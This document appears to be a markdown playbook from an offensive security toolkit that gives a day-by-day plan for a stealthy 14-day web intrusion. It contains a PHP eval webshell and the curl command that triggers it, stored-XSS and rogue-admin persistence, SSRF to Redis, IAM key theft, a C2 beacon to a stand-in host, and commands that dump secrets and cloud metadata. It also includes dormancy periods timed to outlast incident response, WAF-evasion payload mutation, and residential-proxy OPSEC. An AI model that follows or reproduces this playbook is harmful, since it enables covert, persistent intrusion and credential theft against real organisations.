# 📅 HIV-Paced Engagement Timeline

> Realistic day-by-day schedule for a full HIV lifecycle engagement.
> Each day: activities, acceptable request volumes, abort triggers, tool invocations.

---

## The Core Pacing Philosophy

Standard pentest: burn bright, burn fast, get caught.
Scanner-only: immediate flag, immediate block, zero depth.
HIV-paced: **persistent, adaptive, indistinguishable from normal traffic.**

The goal is not speed. The goal is **survival to the final objective.**

---

## Timeline Comparison

| Day | HIV-Paced | Standard Pentest | Scanner-Only |
|---|---|---|---|
| 1 | Passive recon only | Full active scan | Nikto/Nessus blast |
| 2 | Active recon, low rate | Exploitation attempt | Blocked at IP |
| 3 | WAF fingerprint | Burp intruder run | Engagement over |
| 4 | First access attempt (5 req) | Report writing | — |
| 5 | Mutation campaign (adaptive) | Delivered | — |
| 6 | Persistence → GO DARK | — | — |
| 7-8 | Zero activity | — | — |
| 9 | Verify persistence | — | — |
| 10 | Infrastructure abuse | — | — |
| 11-13 | Zero activity (latent) | — | — |
| 14 | Reactivation → final objective | — | — |

**HIV-paced survives 14+ days and achieves deep objectives.**
**Scanner-only is over by Day 3 with nothing but a blocked IP.**

---

## Day 0: Pre-Engagement Setup (OPSEC)

**Objective:** Clean slate. No existing artifacts that could link to you.

```
□ Fresh VM or clean browser profile
□ VPN: residential proxy pool configured (NOT datacenter VPN)
□ Burp Suite: proxy config, no active scanner, logging minimal
□ rat_ghost.py: configured with target's correct UA/headers
□ rat_h3.py: verified working against CF edge IPs
□ rat_oob.py: OOB domain configured and tested
□ hiv_waf_fp.py: tested against a known WAF (validation)
□ hiv_score.py: run against target profile from public OSINT

Acceptable requests today: 0 (no target contact)
Abort trigger: N/A
```

---

## Day 1: Stage 1 — Passive Recon Only

**Objective:** Maximum intelligence, zero target contact.

```
Activities:
□ crt.sh: curl "https://crt.sh/?q=%.target.com&output=json" | jq '.[].name_value' | sort -u
□ Wayback Machine: https://web.archive.org/cdx/search/cdx?url=*.target.com/*&output=json
□ GitHub dorking:
  site:github.com target.com "api_key"
  site:github.com target.com "password"
  site:github.com target.com "Authorization: Bearer"
□ Shodan: org:"Target Inc" → enumerate exposed services
□ SecurityTrails: historical DNS, past subdomains
□ JS bundle hunting from Wayback: find old JS files with API endpoints

Tools: all passive — no direct target contact
Acceptable requests to target: 0
Abort trigger: N/A

Output: subdomains.txt, historical_endpoints.txt, potential_leaks.txt
```

---

## Day 2-3: Stage 1 — Active Recon + WAF Fingerprint

**Objective:** Active but stealthy surface mapping.

```
Day 2 Activities:
□ HTTP headers probe (1 request per subdomain, 2s delay):
  curl -sI https://target.com | head -20
□ Technology detection: whatweb --quiet --log-json=tech.json https://target.com
□ robots.txt, sitemap.xml, .well-known/: 3 requests total
□ JS bundle download (1 request): curl -s https://target.com/main.js > main.js
□ Extract API endpoints: grep -oP '"\/api\/[^"]*"' main.js | sort -u

Acceptable requests Day 2: <20 total, 2s+ delay between each
Abort trigger: Any 429 or challenge page → stop, wait 6h

Day 3 Activities:
□ WAF fingerprint:
  python hiv_waf_fp.py --target https://target.com
□ Auth flow mapping: manual trace of login/register/reset (5-10 requests)
□ Cookie analysis: note names, attributes (SameSite, Secure, HttpOnly)
□ Token format: JWT? opaque? How long are they?
□ Rate limit probe: send 3 identical requests, observe if 429/block appears

Acceptable requests Day 3: <30 total, human timing (3-8s between)
Abort trigger: IP block or CAPTCHA → enter 48h cooling period

Output: waf_report.json, auth_flow_map.md, rate_limit_threshold.txt
```

---

## Day 4: Stage 2 — First Access Attempts (Low Rate)

**Objective:** Identify initial access vector. NOT to exploit — to confirm vulnerability exists.

```
Activities:
□ Run hiv_score.py with data from Days 1-3
□ Select top 2 access vectors from scoring output
□ For vector #1: send 3-5 probe requests (1 per 90s)
  python hiv_mutator.py --target https://target.com/api/search --param q --type xss --rounds 5
□ Analyze responses: reflection? behavioral change? timing?
□ If 403: note, switch to vector #2
□ DO NOT: send more than 10 total probe requests today
□ DO NOT: repeat any blocked payload

Acceptable requests: <10, 60-120s between each
Abort trigger: 3 consecutive 403s → stop, wait 24h (go to Day 5 with mutation focus)

Output: access_vectors_ranked.txt, initial_responses.json
```

---

## Day 5: Stage 3 — Mutation Campaign (Adaptive)

**Objective:** Find the variant that bypasses WAF. One confirmed payload is the goal.

```
Activities:
□ Load waf_report.json → select WAF-specific mutation strategy
□ Run adaptive mutation campaign (max 30 rounds, 60s between each):
  python hiv_mutator.py \
    --target https://target.com/api/search \
    --param q \
    --type xss \
    --rounds 30 \
    --delay 60 \
    --waf-profile waf_report.json
□ Monitor: after each response, adaptive selection of next mutation
□ If 15 rounds blocked: pause 4h, then try HTTP/3:
  python rat_h3.py --target target.com --path "/api/search?q=MUTATED_PAYLOAD"
□ If H3 blocked: try alternate protocol (WebSocket upgrade)
□ If confirmed: STOP. Document the working payload. Do NOT exploit further today.

Acceptable requests: <35 total today, 60s+ between each
Abort trigger: >20 consecutive 403s → exit campaign, switch vector (return to Day 4 with new vector)

Output: confirmed_payload.txt (if found), mutation_campaign_log.json
```

---

## Day 6: Stage 4 — Persistence Establishment → GO DARK

**Objective:** Plant the provirus. This is the most critical day. Move fast.

```
T+0:00  Verify access vector still works (1 test request)
T+0:05  BEGIN PERSISTENCE PLANTING

Depending on access type:

[IF XSS CONFIRMED]
  → Plant stored XSS in highest-traffic user input (profile, comment, etc)
  → Verify fire with rat_oob.py: python rat_oob.py wait --tag xss_plant

[IF SQLI CONFIRMED]  
  → Create secondary admin account via INSERT INTO users
  → Verify login with new credentials

[IF FILE UPLOAD RCE]
  → Plant webshell: echo '<?php @eval(base64_decode(@$_POST["x"]));?>' > shell.php
  → Verify: curl -s https://target.com/uploads/shell.php -d "x=cGhwaW5mbygpOw=="

[IF SSRF TO INTERNAL]
  → SSRF to Redis: gopher://internal:6379/_SET session:adminhijack 1
  → OR: steal IAM credentials → create parallel access key

T+0:30  PERSISTENCE VERIFIED → START hiv_beacon.py
  python hiv_beacon.py --c2 https://your-c2.com --interval 14400 --jitter 7200

T+0:45  GO DARK
  - Stop ALL tool activity
  - Stop ALL requests to target
  - Disconnect proxy
  - DO NOT check on it for 72 hours

Acceptable requests today: <10 (access verification + persistence planting only)
Abort trigger: If persistence planting fails after 3 attempts → document what you have, abort to Day 9

Output: persistence_verification.txt, beacon_config.env (in memory only)
```

---

## Day 7-8: Zero Activity (Mandatory Dormancy)

**Objective:** Let defender's incident response (if any) conclude.

```
Activities:
□ Nothing. Zero contact with target.
□ Watch external indicators:
  - Is the target's status page showing any incident?
  - Any public tweets/news about security incident?
  - Did your OOB callback receive any "investigation" traffic?

If you see investigation indicators:
  → Extend dormancy to Day 14 (12 more days)
  → Defender is in incident response → wait for stand-down

If no indicators:
  → Proceed to Day 9 as planned

Acceptable requests: 0
```

---

## Day 9: Verify Persistence Survived

**Objective:** Confirm the provirus is still alive after defender's routine maintenance.

```
Activities:
□ Single test request to verify persistence mechanism:
  [XSS] → check if stored payload still in place (1 request)
  [Webshell] → curl -s https://target.com/uploads/shell.php (1 request)
  [Beacon] → check hiv_beacon.py log for successful check-in
  [OAuth] → call one API endpoint with OAuth token (1 request)
  [IAM key] → aws sts get-caller-identity (no network to target)

□ If persistence survived: proceed to Day 10
□ If persistence lost:
  - Did credential rotation happen? → check if OAuth still works (different mechanism)
  - Was webshell removed? → was beacon still checking in? activate backup
  - All mechanisms failed? → return to Day 5 (mutation) with lessons learned

Acceptable requests: 1-3 (verification only)
Abort trigger: All persistence mechanisms dead → engage latency 7 days, then retry Stage 4
```

---

## Day 10: Stage 5 — Infrastructure Abuse

**Objective:** Use the target's own infrastructure to deepen access.

```
Activities:
□ From webshell/RCE:
  - Read environment variables: env | grep -iE "api|key|token|secret|db|dsn"
  - Check cloud metadata: curl http://169.254.169.254/latest/meta-data/iam/
  - Internal network map: ss -tlnp (what services are running internally)

□ From OAuth/stolen session:
  - Access internal APIs that the OAuth app has permission to call
  - SSRF: does app have proxy endpoint? /api/proxy?url=http://internal/

□ From IAM key:
  - aws s3 ls (enumerate accessible buckets)
  - aws secretsmanager list-secrets
  - aws iam list-users (enumerate other accounts)

□ Document everything found (for bug bounty report if applicable)

Acceptable requests: ~20-30 (spread over 4-8 hours with human timing)
Abort trigger: If cloud IAM operations fail unexpectedly → key may be rotated → return to Day 9
```

---

## Day 11-13: Latent Phase (Zero Activity)

**Objective:** Another dormancy window. Let operations settle. Prepare final objective.

```
Activities:
□ Zero target contact
□ Analyze what you have:
  - What data was accessible?
  - What's the highest-severity finding?
  - What proof do you need for report?
  - What's still missing?
□ Prepare report structure (for bug bounty) while dormant
□ Plan Day 14 precisely: what exactly will you do, in what order, with what tool
```

---

## Day 14: Reactivation → Final Objective

**Objective:** Achieve primary objective with precision. Document everything.

```
Activities:
□ Activate from latency: verify beacon still checking in
□ Execute precise, targeted actions to achieve objective:
  [Bug bounty] → capture minimum proof of impact (3 data records, NOT thousands)
  [Red team] → access designated "crown jewel" resource, document

□ Capture evidence:
  - Screenshots of access/data
  - Request/response logs
  - python rat_oob.py gen --tag final_proof → trigger → python rat_oob.py wait --tag final_proof

□ Return to latency after objective achieved
□ Do NOT continue testing after objective achieved

Acceptable requests: targeted minimum (10-20 max for proof capture)
Abort trigger: Unexpected block → cease immediately, document current state

Output: FINAL_EVIDENCE/ folder with all proof
```

---

## Summary Table

| Phase | Days | Requests/Day | Purpose |
|---|---|---|---|
| Setup | 0 | 0 | OPSEC, tools |
| Passive recon | 1 | 0 | Intel gathering |
| Active recon | 2-3 | <20 / <30 | Surface mapping |
| First probes | 4 | <10 | Vector validation |
| Mutation | 5 | <35 | WAF bypass |
| **Persistence** | **6** | **<10** | **CRITICAL — provirus** |
| Dormancy 1 | 7-8 | 0 | Wait out response |
| Verify | 9 | 1-3 | Provirus check |
| Infrastructure | 10 | 20-30 | Deepen access |
| Dormancy 2 | 11-13 | 0 | Preparation |
| **Final** | **14** | **<20** | **Objective** |
| **TOTAL** | **14 days** | **~180 reqs** | **Full HIV lifecycle** |

Standard pentest equivalent: 2 days, ~50,000 requests, immediate detection.
HIV-paced: 14 days, ~180 requests, **survives and achieves objective.**

---

*HIV Engagement Timeline | Security--Skill by wahyunuriman999*
